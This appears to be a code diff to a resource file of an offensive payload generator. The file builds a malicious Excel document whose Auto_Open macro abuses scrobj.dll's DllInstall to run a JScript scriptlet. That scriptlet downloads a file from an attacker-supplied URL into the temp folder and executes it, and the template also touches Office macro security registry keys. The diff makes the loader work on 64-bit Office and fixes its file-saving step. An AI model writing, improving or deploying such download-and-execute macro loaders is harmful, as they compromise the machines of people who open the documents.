@@ -121,8 +121,11 @@
     <value>$global:FullName = "$env:userprofile\Desktop\"+ "qwqdanchun.xls"
 
 $Code = @"
-Private Declare Function DllInstall Lib "scrobj.dll" (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
-
+#If VBA7 And Win64 Then
+    Private Declare PtrSafe Function DllInstall Lib "scrobj.dll" (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
+#Else
+    Private Declare Function DllInstall Lib "scrobj.dll" (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
+#End If
 Sub Auto_Open()
     DllInstall False, ByVal StrPtr("</value>
   </data>
@@ -174,7 +177,7 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Secu
     &lt;![CDATA[
 	var WSHShell = new ActiveXObject("WScript.Shell");
 path = WSHShell.ExpandEnvironmentStrings("%temp%");
-var filepath = path+"/qwqdanchun";
+var filepath = path+"/%filename%";
 var xhr = new ActiveXObject("MSXML2.XMLHTTP");
 xhr.open("GET","%qwqdanchun%", false);
 xhr.send();
@@ -187,10 +190,10 @@ if (xhr.Status == 200) {
     stream.Position = 0;
     if (fso.FileExists(filepath)) {
         try {
-            fso.DeleteFile(filepath);
-            stream.SaveToFile(filepath);
+            fso.DeleteFile(filepath);  
         } catch(err) {}
     }
+    stream.SaveToFile(filepath);
     stream.Close();
     new ActiveXObject("WScript.Shell").Exec(filepath);
 }
